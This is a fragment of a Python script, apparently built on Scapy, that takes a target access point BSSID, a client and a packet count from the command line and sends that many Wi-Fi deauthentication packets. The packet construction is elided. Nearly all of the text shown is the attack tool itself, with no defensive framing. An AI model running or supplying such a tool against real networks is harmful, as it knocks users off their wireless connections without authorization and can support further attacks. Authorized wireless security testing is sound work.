...
parser.add_argument(
    ...
    "--BSSID",
    required=True,
    help="The BSSID of the Wireless Access Point you want to target",
)
parser.add_argument(
    "-c",
    "--Client",
...
parser.add_argument(
    ...
    "--Number",
    required=True,
    help="The number of deauth packets you want to send",
)
...
for n in range(int(args.Number)):
    sendp(packet)
    print(
        f"Deauth sent via: {conf.iface} to BSSID: {args.BSSID} for Client: {args.Client}"
    )
